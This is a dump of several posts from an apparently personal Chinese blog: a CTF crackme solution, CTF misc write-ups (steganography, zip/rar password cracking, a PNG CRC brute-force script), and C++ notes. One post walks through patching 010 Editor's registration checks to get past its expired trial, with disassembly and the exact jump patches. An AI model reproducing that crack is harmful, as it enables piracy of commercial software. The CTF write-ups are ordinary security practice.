(retValue) { retValue = CryptHashData(phHash, keyBuf, dwDataLen, 0); if (retValue) { retValue = CryptDeriveKey(phProv, 0x660Eu, phHash, 1u, \u0026amp;phKey); if (retValue) retValue = CryptDecrypt(phKey, 0, 1, 0, flag_data, pdwDataLen); printf(\u0026quot;%s\u0026quot;,retValue); } } } if (phKey) CryptDestroyKey(phKey); if (phHash) CryptDestroyHash(phHash); if (phProv) CryptReleaseContext(phProv, 0); return retValue; } flag：DASCT{H@sh_a^d_Aes_6y_WinCrypt} ","id":20,"section":"posts","summary":"Crackme 运行一下看图标知道是MFC 拖进ida搜索字符串wrong就能找到事件处理函数 int __thiscall sub_1131E0(struct_this *this) { const void *key_addr; // eax const void *flag_addr; // eax int result; // eax unsigned int key_len; // [esp+18h] [ebp-230h] size_t flag_len; // [esp+20h] [ebp-228h] BYREF","tags":["CTF","reverse"],"title":"2022DASCTF X FATE RE Crackme wp","uri":"https://blog.dx39061.top/2022/04/2022dasctf-x-fate-re-crackme-wp/","year":"2022"},{"content":"010editor登陆绕过 patch__1.0 起因是30天试用期到了，又想白嫖，于是试试逆向搞它，确实不难\n拖进ida静态分析就行\nstring窗口搜索license，找到关键语句\nPassword accepted. This license entitles you to:\\n\\n - Free Upgrades\\n - Free Support\\n - Free Repository Updates\\n\\nuntil 显然是验证通过后的提示语句，跟进去\n交叉引用定位loc_72F4D8函数\n.text:000000000072F4D8 loc_72F4D8: ; CODE XREF: sub_72EA00+6AE↑j .text:000000000072F4D8 mov rdi, [r15] .text:000000000072F4DB ; try { .text:000000000072F4DB call _ZN9RRegister14GetExpiryQDateEv ; RRegister::GetExpiryQDate(void) .text:000000000072F4E0 lea rdi, unk_8ACB72 ; this .text:000000000072F4E7 mov esi, 0Ch ; char * .text:000000000072F4EC mov [rsp+228h+var_68], rax .text:000000000072F4F4 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F4F4 ; } // starts at 72F4DB .text:000000000072F4F9 mov [rsp+228h+var_48], rax .text:000000000072F501 lea rbp, [rsp+228h+var_48] .text:000000000072F509 lea rax, [rsp+228h+var_128] .text:000000000072F511 lea rsi, [rsp+228h+var_68] ; QString * .text:000000000072F519 mov rdx, rbp .text:000000000072F51C mov rdi, rax ; this .text:000000000072F51F mov r13, rax .text:000000000072F522 mov [rsp+228h+var_220], rax .text:000000000072F527 ; try { .text:000000000072F527 call __ZNK5QDate8toStringERK7QString ; QDate::toString(QString const\u0026amp;) .text:000000000072F527 ; } // starts at 72F527 .text:000000000072F52C lea r14, [rsp+228h+var_118] .text:000000000072F534 lea rsi, aPasswordAccept_0 ; \u0026quot;Password accepted. This license entitle\u0026quot;... .text:000000000072F53B mov edx, 78h ; 'x' ; int .text:000000000072F540 mov rdi, r14 ; this .text:000000000072F543 ; try { .text:000000000072F543 call __ZN7QString15fromUtf8_helperEPKci ; QString::fromUtf8_helper(char const*,int) 再往上找发现loc_72F0A8函数 .text:000000000072F0A8 loc_72F0A8: ; CODE XREF: sub_72EA00+5FA↑j .text:000000000072F0A8 ; sub_72EA00+608↑j .text:000000000072F0A8 cmp ebp, 0DBh .text:000000000072F0AE jz loc_72F4D8;上个函数入口 .text:000000000072F0B4 cmp ebp, 0EDh .text:000000000072F0BA jz loc_72F1C8 .text:000000000072F0C0 cmp ebp, 20Ch .text:000000000072F0C6 jz loc_72F1C8 .text:000000000072F0CC cmp r13d, 93h .text:000000000072F0D3 jz short loc_72F148 .text:000000000072F0D5 lea rdi, aInvalidNameOrP ; \u0026quot;Invalid name or password. Please enter \u0026quot;... .text:000000000072F0DC mov esi, 90h ; char * .text:000000000072F0E1 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F0E1 ; } // starts at 72F09D .text:000000000072F0E6 lea rbp, [rsp+228h+var_48] .text:000000000072F0EE mov [rsp+228h+var_48], rax .text:000000000072F0F6 mov rdi, rbp .text:000000000072F0F9 ; try { .text:000000000072F0F9 call _Z10R_ShowInfoRK7QString ; R_ShowInfo(QString const\u0026amp;) .text:000000000072F0F9 ; } // starts at 72F0F9 .text:000000000072F0FE jmp loc_72F04B 跳转语句jz loc_72F4D8，尝试性把jz改成jnz，apply一下\n重新进入010，弹出register窗口，随便输入用户名和密码，点击check license\n弹出成功窗口 点击ok成功进入应用，成功！\npatch__2.0 上次搞完之后能用是能用，但是每次都要点击上面两张图的Check License和OK，十分不方便，于是尝试使2个界面不再弹出\n仔细看main函数，还是挺清晰的\n__int64 __fastcall main(int a1, char **a2, char **a3) { volatile signed __int32 *v3; // rsi int v4; // edx int v5; // ecx int v6; // er8 int v7; // er9 TForm010Ed *v8; // rdi __int64 (__fastcall ***v9)(_QWORD); // rax QMetaObject *v10; // rax const char *v11; // rax int v12; // edx volatile signed __int32 *v13; // rax __int64 v14; // rdx char *v15; // rsi QApplication *v16; // r14 const QString *v17; // rdx __int64 v18; // r14 TForm010Ed *v19; // rdi unsigned int v20; // er15 int v21; // eax QObject *v22; // r14 const char *v23; // rdx QApplication *v24; // rdi unsigned int v25; // er13 QTimer *v26; // rdx __int64 v27; // r14 volatile signed __int32 **v28; // r13 volatile signed __int32 *v29; // rax volatile signed __int32 **v30; // r8 volatile signed __int32 **i; // rdx int v33; // edx QDesktopWidget *v34; // rax __int64 v35; // rsi const char *v36; // rcx QWidget *v37; // [rsp+0h] [rbp-178h] int v38; // [rsp+0h] [rbp-178h] QWidget *v39; // [rsp+0h] [rbp-178h] QWidget *v40; // [rsp+0h] [rbp-178h] QWidget *v41; // [rsp+0h] [rbp-178h] char v42; // [rsp+8h] [rbp-170h] int v43; // [rsp+8h] [rbp-170h] int v44; // [rsp+10h] [rbp-168h] int v45; // [rsp+10h] [rbp-168h] void *v46; // [rsp+18h] [rbp-160h] BYREF int v47[2]; // [rsp+20h] [rbp-158h] BYREF QTimer *v48; // [rsp+28h] [rbp-150h] QTimer *v49[2]; // [rsp+30h] [rbp-148h] BYREF QDateTime *v50; // [rsp+40h] [rbp-138h] BYREF char v51; // [rsp+48h] [rbp-130h] int v52; // [rsp+50h] [rbp-128h] BYREF char v53; // [rsp+58h] [rbp-120h] __int64 v54; // [rsp+60h] [rbp-118h] BYREF int v55; // [rsp+68h] [rbp-110h] int v56; // [rsp+70h] [rbp-108h] BYREF char v57; // [rsp+78h] [rbp-100h] int v58; // [rsp+80h] [rbp-F8h] BYREF char v59; // [rsp+88h] [rbp-F0h] int v60; // [rsp+90h] [rbp-E8h] BYREF char v61; // [rsp+98h] [rbp-E0h] int v62[2]; // [rsp+A0h] [rbp-D8h] BYREF char v63; // [rsp+A8h] [rbp-D0h] char v64[32]; // [rsp+B0h] [rbp-C8h] BYREF char v65[104]; // [rsp+D0h] [rbp-A8h] BYREF unsigned __int64 v66; // [rsp+138h] [rbp-40h] v66 = __readfsqword(0x28u); qInstallMessageHandler(\u0026amp;R_MessageOutput, a2, a3); sub_5680C0(); nullsub_31(); RProgress::CreateProgress((RProgress *)\u0026amp;R_MessageOutput); QCoreApplication::setAttribute(20LL, 1LL); QCoreApplication::setAttribute(13LL, 1LL); v3 = (volatile signed __int32 *)\u0026amp;v46 + 1; sub_5943F0((QObject *)v65, v37, v42, v44, (int)v46, (int)\u0026amp;QArrayData::shared_null, (char)v48); dword_10B8F10 = (RApplication *)v65; sub_595D00((unsigned int)v65, (unsigned int)\u0026amp;v46 + 4, v4, v5, v6, v7, v38, v43, v45, (char)v46); v8 = (TForm010Ed *)v49; QCoreApplication::arguments((QCoreApplication *)v49); if ( !(unsigned int)TForm010Ed::CheckRunOnlyOnce((TForm010Ed *)v49) || (v8 = dword_10B8F10, !(unsigned int)sub_594C60(dword_10B8F10)) ) { TForm010Ed::CheckDebugFlags(v8); v9 = (__int64 (__fastcall ***)(_QWORD))QApplication::style(v8); v10 = (QMetaObject *)(**v9)(v9); v11 = (const char *)QMetaObject::className(v10); v12 = -1; if ( v11 ) v12 = strlen(v11); QString::fromUtf8_helper((QString *)v62, v11, v12); v13 = *(volatile signed __int32 **)v47; v14 = *(_QWORD *)v62; *(_QWORD *)v62 = *(_QWORD *)v47; *(_QWORD *)v47 = v14; if ( !**(_DWORD **)v62 || **(_DWORD **)v62 != -1 \u0026amp;\u0026amp; !_InterlockedDecrement(v13) ) QArrayData::deallocate(*(_QWORD *)v62, 2LL, 8LL); v15 = \u0026quot;QCleanlooksStyle\u0026quot;; if ( (unsigned __int8)QString::operator==(v47, \u0026quot;QCleanlooksStyle\u0026quot;) || (v15 = \u0026quot;QCDEStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QCDEStyle\u0026quot;)) || (v15 = \u0026quot;QPlastiqueStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QPlastiqueStyle\u0026quot;)) || (v15 = \u0026quot;QMotifStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QMotifStyle\u0026quot;)) || (v15 = \u0026quot;QWindowsStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QWindowsStyle\u0026quot;)) || (v15 = \u0026quot;QGtkStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QGtkStyle\u0026quot;)) || (v15 = \u0026quot;QFusionStyle\u0026quot;, (unsigned __int8)QString::operator==(v47, \u0026quot;QFusionStyle\u0026quot;)) ) { v16 = (QApplication *)operator new(0x10uLL); sub_56DC50(v16); QApplication::setStyle(v16, (QStyle *)v15); } R_InitializeCustomCodecs(); QGuiApplication::setLayoutDirection(0LL); RStandardPaths::GetProgDir((RStandardPaths *)\u0026amp;v54, 1); v39 = (QWidget *)\u0026amp;v54; operator+((QString *)\u0026amp;v56); RStandardPaths::GetProgDir((RStandardPaths *)\u0026amp;v50, 1); operator+((QString *)\u0026amp;v52); RHelp::Initialize((RHelp *)\u0026amp;v52, (const QString *)\u0026amp;v56, v17); QString::~QString((QString *const)\u0026amp;v52); QString::~QString((QString *const)\u0026amp;v50); QString::~QString((QString *const)\u0026amp;v56); QString::~QString((QString *const)\u0026amp;v54); if ( (int)sub_45E320() \u0026lt; 0 ) goto LABEL_42; v18 = operator new(0x50uLL); sub_52F000(v18); unk_10B8F38 = v18; sub_52FD20(v18); if ( !*((_DWORD *)dword_10B8F10 + 8) ) RRegister::DecreaseNumUsesLeft(unk_10B8F38); RRegister::CheckPortableInstallLicenseFromLocal(unk_10B8F38); v19 = (TForm010Ed *)unk_10B8F38; v20 = RRegister::CheckStatus(unk_10B8F38, 13, 18887); if ( *((_DWORD *)dword_10B8F10 + 8) \u0026amp;\u0026amp; v20 != 219 ) { v19 = (TForm010Ed *)unk_10B8F38; RRegister::DecreaseNumUsesLeft(unk_10B8F38); } v21 = TForm010Ed::CheckNoUserInterface(v19); unk_10B8FA5 = v21 != 0; if ( !v21 \u0026amp;\u0026amp; (!(unsigned int)sub_5A8A90() || v20 != 219) ) { *(_QWORD *)v62 = QString::fromAscii_helper((QString *)\u0026quot;:/Icons/resources/Splash.png\u0026quot;, (const char *)0x1C, v33); QPixmap::QPixmap(v64, v62, 0LL, 0LL); QString::~QString((QString *const)v62); v34 = (QDesktopWidget *)QApplication::desktop((QApplication *)v62); v35 = QDesktopWidget::screen(v34, -1); v39 = (QWidget *)operator new(0x40uLL); sub_59A250(v39, v35, v64, 0x40000LL, v20); qword_10B8EF0 = v39; QWidget::show(v39); QSplashScreen::repaint(qword_10B8EF0); QCoreApplication::processEvents(0LL); QTimer::singleShot((QTimer *)0x9C4, (int)dword_10B8F10, (const QObject *)\u0026quot;1on_CloseSplash()\u0026quot;, v36); QPixmap::~QPixmap((QPixmap *)v64); } v22 = (QObject *)operator new(0x1288uLL); sub_5D92B0( v22, (__int64)v39, (int)\u0026amp;v56, (int)v62, v46, v47[0], v48, v49[0], v49[1], v50, v51, v52, v53, v54, v55, v56, v57, v58, v59, v60, v61, v62[0], v63); qword_10B8EF8 = v22; QWidget::setUpdatesEnabled(v22, 0); sub_584E10(v64, unk_10B8F00); QApplication::setPalette((QApplication *)v64, 0LL, v23); if ( (unsigned int)sub_5B5A80(qword_10B8EF8) == -1 ) goto LABEL_46; if ( v20 == 375 || v20 == 47 || v20 == 237 || v20 == 275 || v20 == 524 \u0026amp;\u0026amp; (unsigned int)RRegister::CheckForNotice(unk_10B8F38) ) { QString::fromUtf8_helper((QString *)\u0026amp;v58, \u0026quot;:/Icons/resources/010_icon_32x32.png\u0026quot;, 36); QIcon::QIcon((QIcon *)\u0026amp;v60, (const QString *)\u0026amp;v58); QApplication::setWindowIcon((QApplication *)\u0026amp;v60, (const QIcon *)\u0026amp;v58); QIcon::~QIcon((QIcon *)\u0026amp;v60); QString::~QString((QString *const)\u0026amp;v58); if ( !qword_10B9690 ) { v41 = (QWidget *)operator new(0x1C0uLL); sub_72FF40(v41); qword_10B9690 = v41; } sub_72DF80(qword_10B9690); RApplication::on_CloseSplash((RApplication *)v65); if ( !(*(unsigned int (__fastcall **)(QObject *, __int64))(*(_QWORD *)qword_10B9690 + 424LL))(qword_10B9690, 1LL) \u0026amp;\u0026amp; *((_DWORD *)qword_10B9690 + 102) ) { v25 = -1; goto LABEL_47; } if ( qword_10B9690 ) (*(void (__fastcall **)(QObject *))(*(_QWORD *)qword_10B9690 + 32LL))(qword_10B9690); v40 = (QWidget *)operator new(0x1C0uLL); sub_72FF40(v40); qword_10B9690 = v40; } if ( unk_10B8FA5 ) { sub_5D85A0(qword_10B8EF8, (__int64)v40); } else if ( *((_DWORD *)qword_10B8EF8 + 1049) ) { QWidget::showNormal(qword_10B8EF8); QWidget::showMaximized(qword_10B8EF8); } else { QWidget::show(qword_10B8EF8); } QWidget::setUpdatesEnabled(qword_10B8EF8, 1); sub_5D50C0(qword_10B8EF8); v24 = qword_10B8EF8; TForm010Ed::RunCommandLineParams(qword_10B8EF8); if ( unk_10B8FAA || unk_10B8FA5 \u0026amp;\u0026amp; (v24 = qword_10B8EF8, !(unsigned int)sub_5B2BE0(qword_10B8EF8)) ) LABEL_46: v25 = unk_10B8F98; else v25 = QApplication::exec(v24); LABEL_47: QPalette::~QPalette((QPalette *)v64); goto LABEL_43; } RApplication::SendBringToFrontMessage(dword_10B8F10); v26 = v49[0]; v27 = 1LL; if ( *((_DWORD *)v49[0] + 3) - *((_DWORD *)v49[0] + 2) \u0026gt; 1 ) { do { if ( *(_DWORD *)v26 \u0026gt; 1u ) { v28 = (volatile signed __int32 **)((char *)v49[0] + 8 * *((int *)v49[0] + 2) + 16); v29 = (volatile signed __int32 *)QListData::detach((QListData *)v49, *((_DWORD *)v49[0] + 1)); v3 = (volatile signed __int32 *)*((int *)v49[0] + 3); v30 = (volatile signed __int32 **)((char *)v49[0] + 8 * (_QWORD)v3 + 16); for ( i = (volatile signed __int32 **)((char *)v49[0] + 8 * *((int *)v49[0] + 2) + 16); v30 != i; ++v28 ) { if ( i ) { v3 = *v28; *i = *v28; if ( (unsigned int)(*v3 + 1) \u0026gt; 1 ) _InterlockedAdd(v3, 1u); } ++i; } if ( !*v29 || *v29 != -1 \u0026amp;\u0026amp; !_InterlockedSub(v29, 1u) ) QList\u0026lt;QString\u0026gt;::dealloc(v29); v26 = v49[0]; } TForm010Ed::SendLoadFileMessage( (QTimer *)((char *)v26 + 8 * v27 + 8 * *((int *)v26 + 2) + 16), (const QString *)v3); v26 = v49[0]; ++v27; } while ( (int)v27 \u0026lt; *((_DWORD *)v49[0] + 3) - *((_DWORD *)v49[0] + 2) ); } LABEL_42: v25 = 0; LABEL_43: QList\u0026lt;QLabel *\u0026gt;::~QList(v49); sub_45E4E0((QApplication *)v65); QString::~QString((QString *const)v47); return v25; } 发现函数RRegister::CheckStatus，猜测应该是检查是否在30天试用期内，具体原理不明，查看汇编 .text:000000000045CEB3 loc_45CEB3: ; CODE XREF: main+6CE↓j .text:000000000045CEB3 lea rax, unk_10B8F38 .text:000000000045CEBA mov rdi, [rax] .text:000000000045CEBD call _ZN9RRegister36CheckPortableInstallLicenseFromLocalEv ; RRegister::CheckPortableInstallLicenseFromLocal(void) .text:000000000045CEC2 lea rax, unk_10B8F38 .text:000000000045CEC9 mov edx, 49C7h .text:000000000045CECE mov esi, 0Dh .text:000000000045CED3 mov rdi, [rax] .text:000000000045CED6 call _ZN9RRegister11CheckStatusEii ; RRegister::CheckStatus(int,int) .text:000000000045CEDB cmp eax, 0DBh .text:000000000045CEE0 mov r15d, eax .text:000000000045CEE3 mov rax, [r13+0] .text:000000000045CEE7 setnz r14b .text:000000000045CEEB cmp dword ptr [rax+20h], 0 .text:000000000045CEEF jz short loc_45CF05 .text:000000000045CEF1 test r14b, r14b .text:000000000045CEF4 jz short loc_45CF05 .text:000000000045CEF6 lea rax, unk_10B8F38 .text:000000000045CEFD mov rdi, [rax] .text:000000000045CF00 call _ZN9RRegister19DecreaseNumUsesLeftEv ; RRegister::DecreaseNumUsesLeft(void) 尝试把call RRegister::CheckStatus整个patch掉，使其不进行检查直接进入应用\napply一下，重新运行程序，成功！\n","id":21,"section":"posts","summary":"010editor登陆绕过 patch__1.0 起因是30天试用期到了，又想白嫖，于是试试逆向搞它，确实不难 拖进ida静态分析就行 string窗口搜索licen","tags":["reverse","crack"],"title":"010Editor逆向-登陆绕过","uri":"https://blog.dx39061.top/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/","year":"2022"},{"content":"金三胖 下载附件是个gif\n用gimp打开查看每一帧，其中夹杂着flag{he11ohongke}\n二维码 附件是个二维码，扫描出文字secret is here\nbinwalk扫一下\n↪ binwalk ./QR_code.png 2022年 03月 28日 星期一 22:15:42 CST DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 280 x 280, 1-bit colormap, non-interlaced 471 0x1D7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 29, uncompressed size: 15, name: 4number.txt 650 0x28A End of Zip archive, footer length: 22 binwalk -d分不出来\nforemost分离发现一个加密的压缩包\nkali利用john解密\nzip2john ./00000000.zip \u0026gt; passwd.txt john passwd.txt 得到密码7639\n解压压缩包得到txt文件即可看到flagCTF{vjpw_wnoei}\n你竟然赶我走 附件是一张jpg文件\n用010查看二进制文件拉到最后即可看到flagflag{stego_is_s0_bor1ing}\nN种方法解决 附件为key.exe，010打开发现是base64字符串 在线网站转换成png图片，发现是二维码 扫码得flagKEY{dca57f966e4e4e31fd5b15417da63269} 大白 附件是一张打不开的图片\n原因是出题人改了图片高使crc校验码检查出错\n脚本爆破出图片高\n#!/usr/bin/env python import struct import binascii import os #根据PNG crc校验码爆破出图片宽度、高度 fi=open('./dabai.png','rb').read() #12-15字节代表固定的文件头数据块的标示，16-19字节代表宽度，20-23字节代表高度，24-28字节分别代表 # Bit depth、ColorType、Compression method、Filter method、Interlace method #29-32字节为CRC校验和 for i in range(10000): #pack函数将int转为bytes,\u0026gt;表示大端00 00 00 02,I表示4字节无符号int;\u0026lt;表示小端 02 00 00 00 data=fi[12:20]+struct.pack('\u0026gt;I',i)+fi[24:29] #byte的大小为8bits而int的大小为32bits,转换时进行与运算避免补码问题0x932f8a6b crc=binascii.crc32(data)\u0026amp;0xffffffff #解开为无符号整数 if crc==struct.unpack('\u0026gt;I',fi[29:33])[0]\u0026amp;0xffffffff : print(hex(i)) 0x1df\n用010修改图片高即可正确显示图片\nflagflag{He1l0_d4_ba1}\n基础破解 压缩包加密，提示4位密码，直接用rarcrack爆破\nkali上装的rarcrack有问题，原因不明，arch上又装了一个，成功爆出密码2593\n解压得flag.txt，base64解码得flag\n乌镇峰会种图 Stegsolve打开，找到analyze-\u0026gt;file format，即可看到flagflag{97314e7864a8f6262 7b26f3f998c37f1} 文件中的秘密 Gwenview打开图片，左边属性有一项Windows Comment ，值为flag，windows平台直接查看属性-\u0026gt;备注应该就能看到 wireshark 附件为一段流量包，要求找到登陆的passwd\nwireshark打开，过滤http.request.method==POST即可找到登陆语句\nflag{ffb7567a1d4f4abdffdb54e022f8facd}\nLSB 附件是一张图片，用stegsolve打开 data extract rgb选都选0，dump下来发现是个二维码，扫码即可拿到flag rar 加密压缩包，提示4位纯数字，rarcrack直接爆\n得到密码8795\nflag{1773c5da790bd3caff38e3decd180eb7}\nzip伪加密 粘一篇知乎文章，详细介绍了zip的结构，这一点用010打开会看得十分清晰\n把第0x47位改成00即可修正伪加密\n解压即可拿到flag\n","id":22,"section":"posts","summary":"金三胖 下载附件是个gif 用gimp打开查看每一帧，其中夹杂着flag{he11ohongke} 二维码 附件是个二维码，扫描出文字secret is","tags":["CTF","misc"],"title":"buu misc wp","uri":"https://blog.dx39061.top/2022/04/buu-misc-wp/","year":"2022"},{"content":"变量定义 - auto 由编译器根据上下文自动确定变量的类型 auto i = 3; //i是int型变量 auto k = 4.0f; //k是float型变量 - 指针变量的动态生成与删除 int* ptr = new int; //单个变量 int* array = new int[10]; //10元素数组 delete ptr; //删除指针变量所指的单个内存单元 delete[] ptr //删除多个内存单元组成的内存块 - 左值引用 具名变量的别名：类型名 \u0026amp; 引用名 变量名 int v0; int \u0026amp; v1 = v0 //v1是v0的别名，它们是内存中是同一单元的两个不同名字 引用变量必须在定义时初始化（赋初值）\n被引用变量可以是结构变量成员，如s.m\n函数参数可以是引用类型，表示函数的形参和实参是同一个变量，改变形参将改变实参\nvoid swap（int \u0026amp; a; int \u0026amp; b){ int temp = b; b = a; a = temp; } 函数返回值可以是引用类型，但不能是临时变量（函数内部定义）\n- 右值引用 不能取地址，没有名字的就是右值\n匿名变量（临时变量）的别名：类型名 \u0026amp;\u0026amp; 引用名 表达式\nint \u0026amp;\u0026amp; sum = 3 + 4; float \u0026amp;\u0026amp; res = ReturnRvalue(f1,f2); 函数参数引用，减少临时变量拷贝的开销\nvoid AcceptRvalueRef(T \u0026amp;\u0026amp; s){……} 变量的初始化、类型推导与基于范围的循环 - 初始化列表 int a[] = {1,3,5}; int a[] {1,3,5}; //c++11支持 - 初始化变量 int a = 3+5; int a = {3+5}; int a (3+5); int a {3+5}; //以上全部等效 int* i = new int (10); //int* i =new int * double* d = new double{1.2f}; //同上，赋初值 - 类型推导 使用decltype可以对变量或表达式结果的类型进行推导\nstruct{char* name;} anon_u; struct{ int d; decltype(anon_u) id; } anon_s[100]; int main(){ decltype(anon_s) as; cin\u0026gt;\u0026gt;as[0].id.name; …… } - 基于范围的循环 int main(){ int arr[3] = {1,2,3}; for(int e : arr) //auto e也可以 cout\u0026lt;\u0026lt;e; return 0; } 函数重载 同名函数两种实现，必须保证参数不同，返回值，参数名称不能作为区分标准 void print(char* msg){ cout\u0026lt;\u0026lt;msg\u0026lt;\u0026lt;endl; } void print(int score){ cout\u0026lt;\u0026lt;score\u0026lt;\u0026lt;endl; } int main(){ print(\u0026quot;Hello\u0026quot;); print(1); return 0; } 函数参数缺省值与追踪返回类型的函数 - 函数参数缺省值（默认值） 缺省值必须从最后一个开始向前排列 void print(char* msg = \u0026quot;hello\u0026quot;){ cout\u0026lt;\u0026lt;msg\u0026lt;\u0026lt;endl; } int main(){ print(\u0026quot;Beijing...\u0026quot;); print(); return 0; }//输出Beijing...hello -追踪返回类型的函数 int func(char* ptr, int val); //普通函数声明 auto func(char* ptr, int val)-\u0026gt;int; //追踪返回类型的函数声明 auto func(char* ptr, int val)-\u0026gt;decltype(……) //常用方法 类的定义 - 基本概念 用户自定义的类型，包含函数与数据的特殊“结构体”，称为“对象”\n类中包含的函数，称为“成员函数”，数据称为“数据成员”\n类中函数既可以在类中定义，也可以在类外给出定义（类名::函数名，其中::称为“域运算符）\nclass Matrix{ public: void fill(char dir){ ……; //在类中定义成员函数 } }; ------------------------------------------------------------ void Matrix::fill(char dir){ ……; //在类外定义成员函数 } 类的成员（数据、函数）可以根据需要分成组，不同组设置不同的访问权限\n权限种类：public、private、protected\n- This指针 指向当前对象的指针变量 class Matrix{ public: void fill{ …… this-\u0026gt;data[0][0] = 1; //data[0][0] = 1; 二者等价 } }; 类的访问权限与友元 - 类成员的访问权限 class中成员缺省属性为private class Matrix{ public： void fill(char dir); private: int data[6][6]; }; //等价于 class Matrix{ int data[6][6]; public： void fill(char dir); }; 在类的外部不能用.操作符访问对对象的私有成员或保护成员，只能访问公有属性 int main(){ Matrix obj; //定义变量（对象） obj.fill('u'); //访问公有成员 obj.data[1][1] = 23; //Error！不能访问私有成员 return 0; } 保护成员（protected）可以在派生类（即子类）中访问 - 友元 可以通过声明函数为类的友元来实现访问对象的私有成员 class Test{ int id; public: friend void print(Test obj); }; void print(Test obj){ cout\u0026lt;\u0026lt;obj.id\u0026lt;\u0026lt;endl; } 构造函数与析构函数 - 构造函数 由编译器自动生成调用语句，用于对象数据成员的初始化，以及其他初始化工作\n构造函数没有返回值类型，函数名与类名相同\n类的构造函数可以重载，即可以使用不同的函数参数进行对象初始化\nclass Student{ long ID; public: Student(long id){ID = id;} Student(int year, int order){ ID = year * 10000 + order; } }; 默认构造函数\n若未提供构造函数，则编译器自动生成不带任何参数的构造函数\n在定义元素为对象的数组（ClassName array_var[NUM];）时，类必须提供构造函数\n构造函数的初始化列表\n在()之后，{之前，以：开头，使用数据成员（初始值）的形式 class Student{ long ID; public: Student(long id):ID(id){} Student(int year,int order){ ID = year * 10000 +order; } }; 在构造函数中调用其他构造函数（委派构造函数） class Info{ public: Info() {Init();} Info(int i) : Info() {id = i;} Info(char c) : Info() {gender = c;} private: void Init() {……} int id {2016}; char gender {'M'}; }; - 析构函数 一个类只有一个析构函数，名称是～类名，没有函数返回值，没有函数参数\n编译器在对象生命期结束后自动调用析构函数， 以便释放对象占用的资源\nclass ClassRoom{ int num; long* ID_list; public: ClassRoom() : num(0), ID_list(0) {} …… ~ClassRoom(){ if(ID_list) delete[] ID_list; } }; - 拷贝构造函数 函数调用时以类的对象为形参或返回类的对象时，编译器自动生成调用拷贝构造函数，在已有对象基础上生成新对象\n拷贝构造函数是一种特殊的构造函数，它的参数是语言规定的，是同类对象的常量引用\nclass Person{ int id; …… public: Person(const Person\u0026amp; src) { id = src.id; ……} …… }; 运算符重载 - 赋值运算符重载 ClassName\u0026amp; operator= (const ClassName\u0026amp; right){ if (this != \u0026amp;right){ //避免自己赋值给自己 //将right对象中的内容复制到当前对象中 } return *this; } - 流运算符重载 重载函数的声明（作为友元） class Test{ int id; public: friend istream\u0026amp; operator\u0026gt;\u0026gt; (istream\u0026amp; in, Test\u0026amp; dst); friend ostream\u0026amp; operator\u0026lt;\u0026lt; (ostream\u0026amp; out, const Test\u0026amp; src); }; 重载函数实现 istream\u0026amp; operator\u0026gt;\u0026gt; (istream\u0026amp; in, Test\u0026amp; dst){ in \u0026gt;\u0026gt; dst.id; return in; } ostream\u0026amp; operator\u0026lt;\u0026lt; (ostream\u0026amp; out, Test\u0026amp; src){ out \u0026lt;\u0026lt; src.id \u0026lt;\u0026lt; endl; return out; } - 函数运算符()重载 重载函数实现 ReturnType operator() (Parameters){ …… } className obj; obj(Real_parameters); //obj.operator() (Real_parameters); 重载示例 class Test{ public: int operator() (int a, int b){ return a + b; } }; int main(){ Test sum; cout\u0026lt;\u0026lt;sum(1,2); return 0; } - 下标运算符[]重载 重载函数返回类型\n若是引用，则可出现在等号左边，即obj[index]=value\n若不是引用，则只能出现在等号右边，即var=obj[index]\n重载函数示例\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; //strcmp using namespace std; char week_name[7][4] = {\u0026quot;mon\u0026quot;, \u0026quot;tu\u0026quot;, \u0026quot;wed\u0026quot;, \u0026quot;thu\u0026quot;, \u0026quot;fri\u0026quot;, \u0026quot;sat\u0026quot;, \u0026quot;sun\u0026quot;}; class WeekTemp{ int temp[7]; public: int\u0026amp; operator[] (const char* name){ for(int i = 0; i \u0026lt; 7; i++){ if (strcmp (week_name[i], name) == 0) return temp[i]; } } }; int main(){ WeekTemp beijing; beijing[\u0026quot;mon\u0026quot;] = -3; beijing[\u0026quot;tu\u0026quot;] = -1; return 0; } - 自增减运算符++--重载 前缀运算符重载声明 ReturnType operator++() ReturnType operator--() 后缀运算符重载声明 ReturnType operator++(int dummy);//dummy为哑元，无实际意义，只为区分 ReturnType operator--(int dummy); 静态成员与常量成员 - 静态成员 以static修饰的数据成员，属于类，被所有对象共享\n为静态数据赋初值Type ClassName::static_var = value;\n返回值类型前面加上static修饰的成员函数，不能调用非静态成员函数，没有this指针\n类的静态成员（数据，函数）既可以通过对象访问，也可以通过类名来访问\n- 常量成员 以const修饰的数据成员，在对象的整个生命周期中不可更改\n只能在构造函数的初始化列表中被设置，不允许在函数体中通过赋值来设置\n用const修饰成员函数，则该成员函数在实现时不能有改变对象状态（内容）的语句\n若对象被定义为常量，则它只能调用以const修饰的成员函数，普通函数不允许调用\n移动（拷贝）构造函数 用来“偷”临时变量\u0026quot;的资源，没有名字如返回值等的变量\n语法ClassName(ClassName\u0026amp;\u0026amp;)\n示例\nclass Test{ public: int* buf; Test(Test\u0026amp;\u0026amp; t) : buf(t.buf){ t.buf = nullptr; } } 类中成员函数default - 编译器自动生成的成员函数 默认构造函数：空函数，什么也不做\n析构函数：空函数，什么也不做\n拷贝构造函数：按bit位复制对象所占内存的内容\n移动构造函数：同上\n赋值运算符重载：同上\n注意：若用户定义了上述某个成员函数，则编译器不再自动生成相应的默认实现\n- 同时使用编译器提供的成员函数 class T{ int data; public: T() = default; T(int i) : data(i) {} }; 继承 - 含义 在已有类(Base class)的基础上，通过继承来定义新的类(Derived class) - 继承方式 private继承（缺省继承） class Derived : [private] Base{……}; public继承 class Derived : public Base{……}; - 继承基类构造函数 class Base{ int data; public: Base(int i) : data(i) {……} }; class Derive : public Base{ int data; using Base::Base; //继承基类构造函数 } - 派生类中的基类成员 